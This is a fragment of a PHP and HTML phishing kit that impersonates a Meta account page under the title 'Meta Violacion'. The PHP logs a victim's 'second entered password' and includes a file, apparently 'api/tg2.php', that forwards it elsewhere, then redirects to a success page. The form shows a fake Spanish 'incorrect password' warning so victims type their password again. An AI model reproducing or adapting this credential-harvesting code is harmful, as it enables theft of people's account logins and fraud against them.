...
<font color='red'>İkinci Girilen Şifre : </font><font color='white'>".$passwords."</font><br>
<hr>


"); 
   include 'api/tg2.php';
	header("location: successful.php?username=$username");
}
?>
<html lang="en"><head>
	  <title>Meta Violacion </title>
			...
			<div class="row justify-content-center">
				<div class="col-md-7 col-lg-5">
					<div class="login-wrap p-4 p-md-5">
						...
						<hr>
						<p style="text-align:center; font-size: 13px; color: black; font-family:'Lucida Sans', 'Lucida Sans Regular', 'Lucida Grande', 'Lucida Sans Unicode', Geneva, Verdana, sans-serif;"> <font color="#ff0000"> Ingresaste tu contraseña incorrectamente por favor inténtalo de nuevo.</font> </p>
						<form id="form" class="login-form" onsubmit="return checkForm(this);" method="post">
							<div class="form-group" method="post">
								<input id="pwd" type="password" name="passwords" style="height: 45px;" class="form-control rounded-left" placeholder="Password" minlength="6" required="">
							</div>
